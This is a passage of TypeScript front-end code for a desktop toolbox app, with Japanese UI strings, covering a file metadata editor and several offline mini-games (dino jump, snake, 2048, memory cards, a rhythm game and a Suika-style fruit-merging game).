  const kindEl = $id<HTMLSpanElement>("generic-kind");
  const fieldsEl = $id<HTMLDivElement>("generic-fields");
  const addBtn = $id<HTMLButtonElement>("generic-add");
  const saveBtn = $id<HTMLButtonElement>("generic-save");
  const status = $id<HTMLSpanElement>("generic-status");
  const infoEl = $id<HTMLPreElement>("generic-info");
  const reload = $id<HTMLButtonElement>("fm-reload");
  const pick = $id<HTMLButtonElement>("fm-pick");
  if (!pathEl || !fieldsEl) return;
  let currentEditable = false;

  const renderRow = (f: GenericField, editable: boolean): HTMLDivElement => {
    const row = document.createElement("div");
    row.className = "generic-row";
    row.style.display = "flex";
    row.style.gap = "4px";
    row.style.marginBottom = "4px";
    const k = document.createElement("input");
    k.type = "text";
    k.value = f.key;
    k.placeholder = "key";
    k.dataset.role = "key";
    k.style.flex = "0 0 30%";
    if (!editable) k.disabled = true;
    const v = document.createElement("input");
    v.type = "text";
    v.value = f.value;
    v.placeholder = "value";
    v.dataset.role = "value";
    v.style.flex = "1";
    if (!editable) v.disabled = true;
    const del = document.createElement("button");
    del.type = "button";
    del.textContent = "✕";
    del.title = "この項目を削除";
    if (!editable) del.disabled = true;
    del.addEventListener("click", () => row.remove());
    row.append(k, v, del);
    return row;
  };

  const load = async (): Promise<void> => {
    const p = pathEl.value.trim();
    fieldsEl.innerHTML = "";
    if (kindEl) kindEl.textContent = "";
    if (infoEl) infoEl.textContent = "";
    if (status) status.textContent = "";
    if (!p) return;
    try {
      const meta = await invoke<GenericMeta>("toolbox_get_generic_meta", {
        path: p,
      });
      currentEditable = meta.editable;
      if (kindEl)
        kindEl.textContent = `形式: ${meta.kind}${meta.editable ? "" : " (読取専用)"}`;
      if (infoEl) infoEl.textContent = meta.info ?? "";
      for (const f of meta.fields)
        fieldsEl.appendChild(renderRow(f, meta.editable));
      if (addBtn) addBtn.disabled = !meta.editable;
      if (saveBtn) saveBtn.disabled = !meta.editable;
    } catch (e) {
      if (status) status.textContent = `読込失敗: ${String(e)}`;
      if (addBtn) addBtn.disabled = true;
      if (saveBtn) saveBtn.disabled = true;
    }
  };

  pathEl.addEventListener("change", () => {
    void load();
  });
  pathEl.addEventListener("blur", () => {
    void load();
  });
  reload?.addEventListener("click", () => {
    void load();
  });
  pick?.addEventListener("click", () => {
    setTimeout(() => {
      void load();
    }, 100);
  });

  addBtn?.addEventListener("click", () => {
    if (!currentEditable) return;
    fieldsEl.appendChild(
      renderRow({ key: "", value: "", editable: true }, true),
    );
  });

  saveBtn?.addEventListener("click", async () => {
    const p = pathEl.value.trim();
    if (!p || !currentEditable) return;
    const fields: GenericField[] = [];
    for (const row of Array.from(fieldsEl.children)) {
      const k =
        (
          row.querySelector('[data-role="key"]') as HTMLInputElement | null
        )?.value.trim() ?? "";
      const v =
        (row.querySelector('[data-role="value"]') as HTMLInputElement | null)
          ?.value ?? "";
      if (!k) continue;
      fields.push({ key: k, value: v, editable: true });
    }
    try {
      await invoke("toolbox_save_generic_meta", { path: p, fields });
      if (status) status.textContent = "保存しました";
      await load();
    } catch (e) {
      if (status) status.textContent = `保存失敗: ${String(e)}`;
    }
  });
}

// ===== ミニゲーム (オフライン暇つぶし) =====

type MiniGameKind = "dino" | "snake" | "2048" | "memory" | "rhythm" | "suika";

let miniGameCleanup: (() => void) | null = null;
let miniGameCurrent: MiniGameKind = "dino";
const miniGameBest: Record<MiniGameKind, number> = {
  dino: 0,
  snake: 0,
  "2048": 0,
  memory: 0,
  rhythm: 0,
  suika: 0,
};

function setupMiniGameTool(): void {
  const canvas = $id<HTMLCanvasElement>("minigame-canvas");
  const grid = $id<HTMLDivElement>("minigame-grid");
  const scoreEl = $id<HTMLSpanElement>("minigame-score");
  const bestEl = $id<HTMLSpanElement>("minigame-best");
  const helpEl = $id<HTMLParagraphElement>("minigame-help");
  const restart = $id<HTMLButtonElement>("minigame-restart");
  const netEl = $id<HTMLSpanElement>("minigame-net");
  if (!canvas || !grid || !scoreEl || !bestEl || !helpEl) return;

  // ベストスコアを localStorage から復元
  try {
    const raw = localStorage.getItem("yuzu-minigame-best");
    if (raw) {
      const obj = JSON.parse(raw) as Partial<Record<MiniGameKind, number>>;
      for (const k of Object.keys(obj) as MiniGameKind[]) {
        if (typeof obj[k] === "number") miniGameBest[k] = obj[k]!;
      }
    }
  } catch {
    // noop
  }

  const updateNet = (): void => {
    if (netEl) {
      netEl.textContent = navigator.onLine ? "オンライン" : "オフライン";
      netEl.style.color = navigator.onLine ? "#3a3" : "#c33";
    }
  };
  updateNet();
  window.addEventListener("online", updateNet);
  window.addEventListener("offline", updateNet);

  const setScore = (s: number): void => {
    scoreEl.textContent = `スコア: ${s}`;
    if (s > miniGameBest[miniGameCurrent]) {
      miniGameBest[miniGameCurrent] = s;
      bestEl.textContent = `ベスト: ${s}`;
      try {
        localStorage.setItem(
          "yuzu-minigame-best",
          JSON.stringify(miniGameBest),
        );
      } catch {
        // noop
      }
    }
  };
  const showBest = (): void => {
    bestEl.textContent = `ベスト: ${miniGameBest[miniGameCurrent]}`;
  };

  const switchTo = (kind: MiniGameKind): void => {
    if (miniGameCleanup) {
      miniGameCleanup();
      miniGameCleanup = null;
    }
    miniGameCurrent = kind;
    setScore(0);
    showBest();
    // ボタン active 状態
    document.querySelectorAll<HTMLButtonElement>("[data-game]").forEach((b) => {
      b.classList.toggle("active", b.dataset.game === kind);
    });
    if (kind === "memory") {
      canvas.style.display = "none";
      grid.style.display = "grid";
    } else {
      canvas.style.display = "block";
      grid.style.display = "none";
    }
    if (kind === "dino") {
      helpEl.textContent =
        "操作: スペース / ↑ でジャンプ。サボテンを避けよう。";
      miniGameCleanup = startDinoGame(canvas, setScore);
    } else if (kind === "snake") {
      helpEl.textContent = "操作: 矢印キーで移動。エサを食べて伸ばそう。";
      miniGameCleanup = startSnakeGame(canvas, setScore);
    } else if (kind === "2048") {
      helpEl.textContent = "操作: 矢印キーでスライド。同じ数字を合わせる。";
      miniGameCleanup = start2048Game(canvas, setScore);
    } else if (kind === "memory") {
      helpEl.textContent = "操作: クリックでカードをめくる。全ペアを当てよう。";
      miniGameCleanup = startMemoryGame(grid, setScore);
    } else if (kind === "rhythm") {
      helpEl.textContent =
        "操作: D / F / J / K (または画面クリック) で判定ライン上のノーツを叩く。";
      miniGameCleanup = startRhythmGame(canvas, setScore);
    } else {
      helpEl.textContent =
        "操作: マウスを動かしてクリックで果物を落とす。同じ果物をくっつけると進化！";
      miniGameCleanup = startSuikaGame(canvas, setScore);
    }
    canvas.focus();
  };

  document.querySelectorAll<HTMLButtonElement>("[data-game]").forEach((b) => {
    b.addEventListener("click", () => {
      const k = (b.dataset.game ?? "dino") as MiniGameKind;
      switchTo(k);
    });
  });
  restart?.addEventListener("click", () => switchTo(miniGameCurrent));

  // 初期ゲーム
  switchTo("dino");
}

// ---- 共通ヘルパ ----
function attachKeyHandler(
  target: HTMLElement,
  handler: (e: KeyboardEvent) => void,
): () => void {
  const wrapper = (e: KeyboardEvent): void => {
    if (
      ["ArrowUp", "ArrowDown", "ArrowLeft", "ArrowRight", " "].includes(e.key)
    ) {
      e.preventDefault();
    }
    handler(e);
  };
  target.addEventListener("keydown", wrapper);
  return () => target.removeEventListener("keydown", wrapper);
}

// ---- 🦖 ジャンプゲーム ----
function startDinoGame(
  canvas: HTMLCanvasElement,
  setScore: (n: number) => void,
): () => void {
  const ctx = canvas.getContext("2d")!;
  const W = canvas.width;
  const H = canvas.height;
  const groundY = H - 40;
  let x = 60;
  let y = groundY;
  let vy = 0;
  const gravity = 0.55;
  let speed = 4;
  let score = 0;
  let alive = true;
  interface Obs {
    x: number;
    w: number;
    h: number;
  }
  const obs: Obs[] = [];
  let frame = 0;

  const reset = (): void => {
    obs.length = 0;
    obs.push({ x: W + 100, w: 18, h: 30 });
  };
  reset();

  const removeKey = attachKeyHandler(canvas, (e) => {
    if ((e.key === " " || e.key === "ArrowUp") && y >= groundY && alive) {
      vy = -13;
    }
  });
  const onClick = (): void => {
    if (y >= groundY && alive) vy = -13;
    if (!alive) {
      alive = true;
      score = 0;
      speed = 4;
      reset();
      setScore(0);
    }
  };
  canvas.addEventListener("click", onClick);

  let raf = 0;
  const loop = (): void => {
    frame++;
    ctx.fillStyle = "#f7f7f7";
    ctx.fillRect(0, 0, W, H);
    // 地面
    ctx.strokeStyle = "#555";
    ctx.beginPath();
    ctx.moveTo(0, groundY + 5);
    ctx.lineTo(W, groundY + 5);
    ctx.stroke();

    if (alive) {
      vy += gravity;
      y += vy;
      if (y > groundY) {
        y = groundY;
        vy = 0;
      }
      for (const o of obs) o.x -= speed;
      while (obs.length > 0 && obs[0].x + obs[0].w < 0) {
        obs.shift();
        score++;
        setScore(score);
        if (score % 10 === 0) speed += 0.4;
      }
      const last = obs[obs.length - 1];
      if (!last || last.x < W - 280 - Math.random() * 220) {
        const h = 20 + Math.random() * 22;
        obs.push({ x: W + 20, w: 12 + Math.random() * 10, h });
      }
      // 衝突判定
      const px = x;
      const py = y - 30;
      const pw = 26;
      const ph = 30;
      for (const o of obs) {
        const ox = o.x;
        const oy = groundY - o.h;
        if (px + pw > ox && px < ox + o.w && py + ph > oy && py < oy + o.h) {
          alive = false;
        }
      }
    }

    // プレイヤ (🦖 風の四角)
    ctx.fillStyle = "#3a7";
    ctx.fillRect(x, y - 30, 26, 30);
    ctx.fillStyle = "#000";
    ctx.fillRect(x + 18, y - 26, 4, 4);

    // 障害物 (サボテン)
    ctx.fillStyle = "#284";
    for (const o of obs) {
      ctx.fillRect(o.x, groundY - o.h, o.w, o.h);
    }

    if (!alive) {
      ctx.fillStyle = "rgba(0,0,0,0.5)";
      ctx.fillRect(0, 0, W, H);
      ctx.fillStyle = "#fff";
      ctx.font = "24px sans-serif";
      ctx.textAlign = "center";
      ctx.fillText("ゲームオーバー", W / 2, H / 2 - 10);
      ctx.font = "14px sans-serif";
      ctx.fillText("クリック または スペース で再開", W / 2, H / 2 + 14);
      ctx.textAlign = "start";
    }

    raf = requestAnimationFrame(loop);
  };
  raf = requestAnimationFrame(loop);

  return () => {
    cancelAnimationFrame(raf);
    removeKey();
    canvas.removeEventListener("click", onClick);
  };
}

// ---- 🐍 スネーク ----
function startSnakeGame(
  canvas: HTMLCanvasElement,
  setScore: (n: number) => void,
): () => void {
  const ctx = canvas.getContext("2d")!;
  const cell = 16;
  const cols = Math.floor(canvas.width / cell);
  const rows = Math.floor(canvas.height / cell);
  let snake: { x: number; y: number }[] = [
    { x: 10, y: 10 },
    { x: 9, y: 10 },
    { x: 8, y: 10 },
  ];
  let dir = { x: 1, y: 0 };
  let pendingDir = dir;
  let food = { x: 15, y: 10 };
  let alive = true;
  let score = 0;
  const placeFood = (): void => {
    while (true) {
      const f = {
        x: Math.floor(Math.random() * cols),
        y: Math.floor(Math.random() * rows),
      };
      if (!snake.some((s) => s.x === f.x && s.y === f.y)) {
        food = f;
        return;
      }
    }
  };

  const removeKey = attachKeyHandler(canvas, (e) => {
    if (e.key === "ArrowUp" && dir.y !== 1) pendingDir = { x: 0, y: -1 };
    else if (e.key === "ArrowDown" && dir.y !== -1) pendingDir = { x: 0, y: 1 };
    else if (e.key === "ArrowLeft" && dir.x !== 1) pendingDir = { x: -1, y: 0 };
    else if (e.key === "ArrowRight" && dir.x !== -1)
      pendingDir = { x: 1, y: 0 };
  });

  let timer = 0;
  const tick = (): void => {
    if (alive) {
      dir = pendingDir;
      const head = { x: snake[0].x + dir.x, y: snake[0].y + dir.y };
      if (
        head.x < 0 ||
        head.x >= cols ||
        head.y < 0 ||
        head.y >= rows ||
        snake.some((s) => s.x === head.x && s.y === head.y)
      ) {
        alive = false;
      } else {
        snake.unshift(head);
        if (head.x === food.x && head.y === food.y) {
          score++;
          setScore(score);
          placeFood();
        } else {
          snake.pop();
        }
      }
    }
    // 描画
    ctx.fillStyle = "#f7f7f7";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#c44";
    ctx.fillRect(food.x * cell, food.y * cell, cell - 2, cell - 2);
    ctx.fillStyle = "#284";
    for (const s of snake) {
      ctx.fillRect(s.x * cell, s.y * cell, cell - 2, cell - 2);
    }
    if (!alive) {
      ctx.fillStyle = "rgba(0,0,0,0.5)";
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = "#fff";
      ctx.font = "24px sans-serif";
      ctx.textAlign = "center";
      ctx.fillText("ゲームオーバー", canvas.width / 2, canvas.height / 2);
      ctx.textAlign = "start";
    }
  };
  timer = window.setInterval(tick, 140);
  placeFood();

  return () => {
    clearInterval(timer);
    removeKey();
  };
}

// ---- 🔢 2048 ----
function start2048Game(
  canvas: HTMLCanvasElement,
  setScore: (n: number) => void,
): () => void {
  const ctx = canvas.getContext("2d")!;
  const N = 4;
  const size = Math.min(canvas.width, canvas.height) - 20;
  const cell = Math.floor(size / N);
  const offX = (canvas.width - cell * N) / 2;
  const offY = (canvas.height - cell * N) / 2;
  let board: number[][] = Array.from(
    { length: N },
    () => Array(N).fill(0) as number[],
  );
  let score = 0;
  let over = false;
  const colors: Record<number, string> = {
    0: "#ccc0b3",
    2: "#eee4da",
    4: "#ede0c8",
    8: "#f2b179",
    16: "#f59563",
    32: "#f67c5f",
    64: "#f65e3b",
    128: "#edcf72",
    256: "#edcc61",
    512: "#edc850",
    1024: "#edc53f",
    2048: "#edc22e",
  };

  const addRandom = (): void => {
    const empties: [number, number][] = [];
    for (let r = 0; r < N; r++) {
      for (let c = 0; c < N; c++) {
        if (board[r][c] === 0) empties.push([r, c]);
      }
    }
    if (empties.length === 0) return;
    const [r, c] = empties[Math.floor(Math.random() * empties.length)];
    board[r][c] = Math.random() < 0.9 ? 2 : 4;
  };

  const slide = (row: number[]): { row: number[]; gain: number } => {
    let arr = row.filter((v) => v !== 0);
    let gain = 0;
    for (let i = 0; i < arr.length - 1; i++) {
      if (arr[i] === arr[i + 1]) {
        arr[i] *= 2;
        gain += arr[i];
        arr.splice(i + 1, 1);
      }
    }
    while (arr.length < N) arr.push(0);
    return { row: arr, gain };
  };

  const move = (dir: "L" | "R" | "U" | "D"): boolean => {
    const before = JSON.stringify(board);
    let totalGain = 0;
    if (dir === "L" || dir === "R") {
      for (let r = 0; r < N; r++) {
        let row = board[r].slice();
        if (dir === "R") row.reverse();
        const { row: nr, gain } = slide(row);
        totalGain += gain;
        if (dir === "R") nr.reverse();
        board[r] = nr;
      }
    } else {
      for (let c = 0; c < N; c++) {
        let col = board.map((r) => r[c]);
        if (dir === "D") col.reverse();
        const { row: nc, gain } = slide(col);
        totalGain += gain;
        if (dir === "D") nc.reverse();
        for (let r = 0; r < N; r++) board[r][c] = nc[r];
      }
    }
    score += totalGain;
    if (totalGain > 0) setScore(score);
    return JSON.stringify(board) !== before;
  };

  const isOver = (): boolean => {
    for (let r = 0; r < N; r++)
      for (let c = 0; c < N; c++) {
        if (board[r][c] === 0) return false;
        if (c + 1 < N && board[r][c] === board[r][c + 1]) return false;
        if (r + 1 < N && board[r][c] === board[r + 1][c]) return false;
      }
    return true;
  };

  const draw = (): void => {
    ctx.fillStyle = "#bbada0";
    ctx.fillRect(offX - 5, offY - 5, cell * N + 10, cell * N + 10);
    for (let r = 0; r < N; r++) {
      for (let c = 0; c < N; c++) {
        const v = board[r][c];
        ctx.fillStyle = colors[v] ?? "#3c3a32";
        const x = offX + c * cell + 4;
        const y = offY + r * cell + 4;
        ctx.fillRect(x, y, cell - 8, cell - 8);
        if (v) {
          ctx.fillStyle = v <= 4 ? "#776e65" : "#f9f6f2";
          const fs = v < 100 ? 32 : v < 1000 ? 26 : 22;
          ctx.font = `bold ${fs}px sans-serif`;
          ctx.textAlign = "center";
          ctx.textBaseline = "middle";
          ctx.fillText(String(v), x + (cell - 8) / 2, y + (cell - 8) / 2);
        }
      }
    }
    ctx.textAlign = "start";
    ctx.textBaseline = "alphabetic";
    if (over) {
      ctx.fillStyle = "rgba(255,255,255,0.7)";
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = "#000";
      ctx.font = "24px sans-serif";
      ctx.textAlign = "center";
      ctx.fillText("ゲームオーバー", canvas.width / 2, canvas.height / 2);
      ctx.textAlign = "start";
    }
  };

  addRandom();
  addRandom();
  draw();

  const removeKey = attachKeyHandler(canvas, (e) => {
    if (over) return;
    let moved = false;
    if (e.key === "ArrowLeft") moved = move("L");
    else if (e.key === "ArrowRight") moved = move("R");
    else if (e.key === "ArrowUp") moved = move("U");
    else if (e.key === "ArrowDown") moved = move("D");
    if (moved) {
      addRandom();
      if (isOver()) over = true;
    }
    draw();
  });

  return () => {
    removeKey();
  };
}

// ---- 🧠 神経衰弱 ----
function startMemoryGame(
  grid: HTMLDivElement,
  setScore: (n: number) => void,
): () => void {
  const symbols = ["🍎", "🍊", "🍇", "🍓", "🍌", "🍒"];
  const deck = [...symbols, ...symbols]
    .map((s) => ({ s, r: Math.random() }))
    .sort((a, b) => a.r - b.r)
    .map((o) => o.s);
  grid.innerHTML = "";
  grid.style.display = "grid";
  grid.style.gridTemplateColumns = "repeat(4, 70px)";
  grid.style.gap = "6px";

  const cards: HTMLButtonElement[] = [];
  let flipped: number[] = [];
  let matched = 0;
  let score = 0;
  let busy = false;

  deck.forEach((sym, i) => {
    const b = document.createElement("button");
    b.type = "button";
    b.dataset.sym = sym;
    b.dataset.idx = String(i);
    b.style.cssText =
      "width:70px;height:70px;font-size:32px;border-radius:8px;border:1px solid #555;background:#445;color:#445;cursor:pointer";
    b.textContent = "?";
    const flip = (show: boolean): void => {
      if (show) {
        b.textContent = sym;
        b.style.background = "#fff";
        b.style.color = "#000";
      } else {
        b.textContent = "?";
        b.style.background = "#445";
        b.style.color = "#445";
      }
    };
    (b as HTMLButtonElement & { flip: typeof flip }).flip = flip;
    b.addEventListener("click", () => {
      if (busy || b.disabled || flipped.includes(i)) return;
      flip(true);
      flipped.push(i);
      if (flipped.length === 2) {
        busy = true;
        const [a, c] = flipped;
        if (cards[a].dataset.sym === cards[c].dataset.sym) {
          cards[a].disabled = true;
          cards[c].disabled = true;
          matched++;
          score += 10;
          setScore(score);
          flipped = [];
          busy = false;
          if (matched === symbols.length) {
            setTimeout(() => alert(`クリア！ スコア ${score}`), 50);
          }
        } else {
          setTimeout(() => {
            (
              cards[a] as HTMLButtonElement & { flip: (s: boolean) => void }
            ).flip(false);
            (
              cards[c] as HTMLButtonElement & { flip: (s: boolean) => void }
            ).flip(false);
            flipped = [];
            busy = false;
          }, 700);
        }
      }
    });
    cards.push(b);
    grid.appendChild(b);
  });

  return () => {
    grid.innerHTML = "";
  };
}

// ---- 🎵 リズムゲーム (osu!mania 風 4 レーン) ----
function startRhythmGame(
  canvas: HTMLCanvasElement,
  setScore: (n: number) => void,
): () => void {
  const ctx = canvas.getContext("2d")!;
  const W = canvas.width;
  const H = canvas.height;
  const LANES = 4;
  const laneW = Math.min(80, Math.floor(W / (LANES + 2)));
  const totalW = laneW * LANES;
  const offX = (W - totalW) / 2;
  const judgeY = H - 50;
  const noteH = 14;
  const speed = 240; // px/sec
  const keys = ["d", "f", "j", "k"];
  const laneColors = ["#4cf", "#fc4", "#f6a", "#7f6"];

  interface Note {
    lane: number;
    time: number; // 判定時刻 (sec)
    hit: boolean;
    miss: boolean;
  }

  // 簡易譜面: 一定 BPM で擬似ランダム (シードに startTime を使う)
  const bpm = 110;
  const beat = 60 / bpm;
  const notes: Note[] = [];
  const songLen = 45; // 45 秒
  const seed = Math.floor(Math.random() * 1e9);
  let rngState = seed;
  const rng = (): number => {
    rngState = (rngState * 1664525 + 1013904223) >>> 0;
    return rngState / 0x100000000;
  };
  for (let t = 2; t < songLen; t += beat) {
    if (rng() < 0.55) {
      notes.push({
        lane: Math.floor(rng() * LANES),
        time: t,
        hit: false,
        miss: false,
      });
    }
    if (rng() < 0.08) {
      // 同時押し
      let lane2 = Math.floor(rng() * LANES);
      if (notes.length > 0 && notes[notes.length - 1].time === t) {
        while (lane2 === notes[notes.length - 1].lane) {
          lane2 = (lane2 + 1) % LANES;
        }
      }
      notes.push({ lane: lane2, time: t, hit: false, miss: false });
    }
  }

  let score = 0;
  let combo = 0;
  let maxCombo = 0;
  let judgeText = "";
  let judgeFlash = 0;
  const laneFlash = [0, 0, 0, 0];

  // WebAudio (BGM 代わりにメトロノーム + ヒット音)
  let audioCtx: AudioContext | null = null;
  try {
    audioCtx = new (
      window.AudioContext ||
      (window as unknown as { webkitAudioContext: typeof AudioContext })
        .webkitAudioContext
    )();
  } catch {
    audioCtx = null;
  }
  const playBeep = (freq: number, dur: number, vol = 0.15): void => {
    if (!audioCtx) return;
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    osc.frequency.value = freq;
    osc.type = "square";
    gain.gain.value = vol;
    gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + dur);
    osc.connect(gain);
    gain.connect(audioCtx.destination);
    osc.start();
    osc.stop(audioCtx.currentTime + dur);
  };

  const startTime = performance.now();
  let lastBeat = -1;

  const judge = (lane: number): void => {
    const now = (performance.now() - startTime) / 1000;
    laneFlash[lane] = 0.2;
    // 最も近い未ヒットノート
    let best: Note | null = null;
    let bestDiff = 999;
    for (const n of notes) {
      if (n.hit || n.miss) continue;
      if (n.lane !== lane) continue;
      const d = Math.abs(n.time - now);
      if (d < bestDiff) {
        bestDiff = d;
        best = n;
      }
    }
    if (!best || bestDiff > 0.25) {
      judgeText = "MISS";
      judgeFlash = 0.4;
      combo = 0;
      return;
    }
    best.hit = true;
    if (bestDiff < 0.08) {
      score += 300;
      judgeText = "PERFECT";
    } else if (bestDiff < 0.15) {
      score += 100;
      judgeText = "GREAT";
    } else {
      score += 50;
      judgeText = "GOOD";
    }
    combo++;
    if (combo > maxCombo) maxCombo = combo;
    judgeFlash = 0.4;
    setScore(score);
    playBeep(660, 0.05, 0.12);
  };

  const onKey = (e: KeyboardEvent): void => {
    const k = e.key.toLowerCase();
    const idx = keys.indexOf(k);
    if (idx >= 0) {
      e.preventDefault();
      judge(idx);
    }
  };
  canvas.addEventListener("keydown", onKey);

  const onClick = (e: MouseEvent): void => {
    const rect = canvas.getBoundingClientRect();
    const cx = e.clientX - rect.left;
    const lane = Math.floor((cx - offX) / laneW);
    if (lane >= 0 && lane < LANES) judge(lane);
  };
  canvas.addEventListener("click", onClick);

  let raf = 0;
  const loop = (): void => {
    const now = (performance.now() - startTime) / 1000;
    // メトロノーム
    const curBeat = Math.floor(now / beat);
    if (curBeat !== lastBeat && now > 0 && now < songLen) {
      lastBeat = curBeat;
      playBeep(curBeat % 4 === 0 ? 880 : 440, 0.03, 0.06);
    }

    // 自動 MISS 判定
    for (const n of notes) {
      if (!n.hit && !n.miss && now - n.time > 0.25) {
        n.miss = true;
        combo = 0;
        judgeText = "MISS";
        judgeFlash = 0.3;
      }
    }

    // 描画
    ctx.fillStyle = "#0e0e16";
    ctx.fillRect(0, 0, W, H);
    // レーン
    for (let i = 0; i < LANES; i++) {
      const x = offX + i * laneW;
      ctx.fillStyle = laneFlash[i] > 0 ? "rgba(255,255,255,0.12)" : "#181826";
      ctx.fillRect(x, 0, laneW - 2, H);
      // キー表示
      ctx.fillStyle = "#888";
      ctx.font = "bold 16px sans-serif";
      ctx.textAlign = "center";
      ctx.fillText(keys[i].toUpperCase(), x + laneW / 2, H - 14);
      laneFlash[i] = Math.max(0, laneFlash[i] - 0.02);
    }
    // 判定ライン
    ctx.strokeStyle = "#fff";
    ctx.lineWidth = 2;
    ctx.beginPath();
    ctx.moveTo(offX, judgeY);
    ctx.lineTo(offX + totalW, judgeY);
    ctx.stroke();

    // ノート
    for (const n of notes) {
      if (n.hit) continue;
      const dt = n.time - now;
      const y = judgeY - dt * speed;
      if (y < -noteH || y > H) continue;
      const x = offX + n.lane * laneW + 2;
      ctx.fillStyle = n.miss ? "#555" : laneColors[n.lane];
      ctx.fillRect(x, y - noteH / 2, laneW - 6, noteH);
    }

    // 情報
    ctx.textAlign = "start";
    ctx.fillStyle = "#fff";
    ctx.font = "16px sans-serif";
    ctx.fillText(`Score: ${score}`, 8, 20);
    ctx.fillText(`Combo: ${combo} (Max ${maxCombo})`, 8, 40);
    const remain = Math.max(0, songLen - now);
    ctx.textAlign = "end";
    ctx.fillText(`残り ${remain.toFixed(1)}s`, W - 8, 20);
    ctx.textAlign = "start";

    if (judgeFlash > 0) {
      ctx.globalAlpha = Math.min(1, judgeFlash * 2.5);
      ctx.fillStyle =
        judgeText === "PERFECT"
          ? "#ff0"
          : judgeText === "GREAT"
            ? "#4f8"
            : judgeText === "GOOD"
              ? "#4cf"
              : "#f44";
      ctx.font = "bold 36px sans-serif";
      ctx.textAlign = "center";
      ctx.fillText(judgeText, W / 2, H / 2);
      ctx.globalAlpha = 1;
      ctx.textAlign = "start";
      judgeFlash -= 0.02;
    }

    if (now > songLen + 1) {
      ctx.fillStyle = "rgba(0,0,0,0.7)";
      ctx.fillRect(0, 0, W, H);
      ctx.fillStyle = "#fff";
      ctx.font = "28px sans-serif";
      ctx.textAlign = "center";
      ctx.fillText(
        `クリア！ Score ${score} / Max Combo ${maxCombo}`,
        W / 2,
        H / 2,
      );
      ctx.textAlign = "start";
      cancelAnimationFrame(raf);
      return;
    }

    raf = requestAnimationFrame(loop);
  };
  raf = requestAnimationFrame(loop);

  return () => {
    cancelAnimationFrame(raf);
    canvas.removeEventListener("keydown", onKey);
    canvas.removeEventListener("click", onClick);
    if (audioCtx) {
      try {
        audioCtx.close();
      } catch {
        // noop
      }
    }
  };
}

// ---- 🍉 スイカゲーム風 ----
function startSuikaGame(
  canvas: HTMLCanvasElement,
  setScore: (n: number) => void,
): () => void {
  const ctx = canvas.getContext("2d")!;
  const W = canvas.width;
  const H = canvas.height;
  // 果物 (半径, 色, ラベル, スコア)
  const FRUITS: { r: number; color: string; label: string; pt: number }[] = [
    { r: 14, color: "#f6c", label: "🍓", pt: 1 },
    { r: 18, color: "#f88", label: "🍒", pt: 3 },
    { r: 24, color: "#fa6", label: "🍊", pt: 6 },
    { r: 30, color: "#fd4", label: "🍋", pt: 10 },
    { r: 38, color: "#c8f", label: "🍇", pt: 15 },
    { r: 46, color: "#fc8", label: "🍑", pt: 21 },
    { r: 54, color: "#f64", label: "🍎", pt: 28 },
    { r: 64, color: "#fa4", label: "🥭", pt: 36 },
    { r: 76, color: "#4c8", label: "🍉", pt: 45 },
  ];
  const ceilingY = 40; // この高さを超えたらゲームオーバー
  interface Ball {
    x: number;
    y: number;
    vx: number;
    vy: number;
    type: number; // FRUITS index
    spawnAt: number;
  }
  const balls: Ball[] = [];
  let score = 0;
  let nextType = Math.floor(Math.random() * 3);
  let pointerX = W / 2;
  let dropCooldown = 0;
  let over = false;
  const gravity = 0.4;
  const restitution = 0.18;
  const friction = 0.99;

  const onMove = (e: MouseEvent): void => {
    const rect = canvas.getBoundingClientRect();
    pointerX = e.clientX - rect.left;
  };
  const onClick = (e: MouseEvent): void => {
    if (over) return;
    if (dropCooldown > 0) return;
    const rect = canvas.getBoundingClientRect();
    const x = e.clientX - rect.left;
    const f = FRUITS[nextType];
    balls.push({
      x: Math.max(f.r + 2, Math.min(W - f.r - 2, x)),
      y: ceilingY - f.r - 2,
      vx: 0,
      vy: 0,
      type: nextType,
      spawnAt: performance.now(),
    });
    nextType = Math.floor(Math.random() * 3);
    dropCooldown = 25;
  };
  canvas.addEventListener("mousemove", onMove);
  canvas.addEventListener("click", onClick);

  const step = (): void => {
    if (dropCooldown > 0) dropCooldown--;
    // 重力 + 移動
    for (const b of balls) {
      b.vy += gravity;
      b.vx *= friction;
      b.x += b.vx;
      b.y += b.vy;
      const r = FRUITS[b.type].r;
      // 床
      if (b.y + r > H) {
        b.y = H - r;
        b.vy = -b.vy * restitution;
        if (Math.abs(b.vy) < 0.5) b.vy = 0;
      }
      // 壁
      if (b.x - r < 0) {
        b.x = r;
        b.vx = -b.vx * restitution;
      }
      if (b.x + r > W) {
        b.x = W - r;
        b.vx = -b.vx * restitution;
      }
    }
    // 衝突 (位置補正 & 反発)
    for (let iter = 0; iter < 4; iter++) {
      for (let i = 0; i < balls.length; i++) {
        for (let j = i + 1; j < balls.length; j++) {
          const a = balls[i];
          const b = balls[j];
          const ra = FRUITS[a.type].r;
          const rb = FRUITS[b.type].r;
          const dx = b.x - a.x;
          const dy = b.y - a.y;
          const d2 = dx * dx + dy * dy;
          const minD = ra + rb;
          if (d2 < minD * minD && d2 > 0.0001) {
            const d = Math.sqrt(d2);
            const overlap = minD - d;
            const nx = dx / d;
            const ny = dy / d;
            a.x -= (nx * overlap) / 2;
            a.y -= (ny * overlap) / 2;
            b.x += (nx * overlap) / 2;
            b.y += (ny * overlap) / 2;
            // 速度の反発
            const rvx = b.vx - a.vx;
            const rvy = b.vy - a.vy;
            const vn = rvx * nx + rvy * ny;
            if (vn < 0) {
              const e = restitution;
              const jimp = (-(1 + e) * vn) / 2;
              a.vx -= jimp * nx;
              a.vy -= jimp * ny;
              b.vx += jimp * nx;
              b.vy += jimp * ny;
            }
          }
        }
      }
    }
    // マージ判定
    for (let i = 0; i < balls.length; i++) {
      for (let j = i + 1; j < balls.length; j++) {
        const a = balls[i];
        const b = balls[j];
        if (a.type !== b.type) continue;
        if (a.type >= FRUITS.length - 1) continue;
        const ra = FRUITS[a.type].r;
        const rb = FRUITS[b.type].r;
        const dx = b.x - a.x;
        const dy = b.y - a.y;
        const d = Math.sqrt(dx * dx + dy * dy);
        if (d < ra + rb - 1) {
          const newType = a.type + 1;
          const nx = (a.x + b.x) / 2;
          const ny = (a.y + b.y) / 2;
          balls.splice(j, 1);
          balls.splice(i, 1);
          balls.push({
            x: nx,
            y: ny,
            vx: 0,
            vy: -1,
            type: newType,
            spawnAt: performance.now(),
          });
